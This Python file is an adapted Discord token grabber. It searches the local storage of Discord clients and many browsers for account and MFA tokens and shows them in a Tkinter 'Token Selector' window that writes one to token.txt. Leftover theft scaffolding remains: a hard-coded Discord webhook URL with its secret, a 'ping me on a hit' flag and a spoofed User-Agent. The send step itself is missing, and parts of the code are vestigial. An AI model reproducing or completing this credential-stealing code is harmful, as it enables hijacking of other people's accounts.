import os
import re
import json
import tkinter as tk
from tkinter import ttk
from urllib.request import Request, urlopen

token_list = []

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1191784785329270834/NrGzL5k4-9-_qn6y_IPKrQeCZhghmZpoZkjshcgO2Ru9rj_Fo4N1MpusKC1NsTsjPlzH'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')

    if not os.path.exists(leveldb_path):
        return []

    tokens = []

    for file_name in os.listdir(leveldb_path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(os.path.join(leveldb_path, file_name), errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    global path
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1',
        'Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 2',
        'Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 3',
        'Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 4',
        'Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 5',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    global message
    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f''
        global tokens
        global token_list
        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += ''

        message += ''

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

if __name__ == '__main__':
    main()

# Function to remove all tokens except the selected one
def remove_tokens():
    selected_item = combo.get()
    
    # Open the token.txt file in write mode
    with open("token.txt", "w") as file:
        # Write the selected item to the file followed by a newline character
        file.write(selected_item + "\n")
    
    print(f"{selected_item} selected and written to token.txt")

# Create the main application window
root = tk.Tk()
root.title("Token Selector")

# Create a label
label = tk.Label(root, text="Select a token to keep.\nYou can also paste your own token into the selection.")

# Create a combo box (select menu)
combo = ttk.Combobox(root, values=message.split('\n'))

# Create a button to remove tokens
remove_button = tk.Button(root, text="Select this", command=remove_tokens)

# Place the label, combo box, and button in the window
label.pack(pady=10)
combo.pack(pady=10)
remove_button.pack()

# Start the Tkinter main loop
root.mainloop()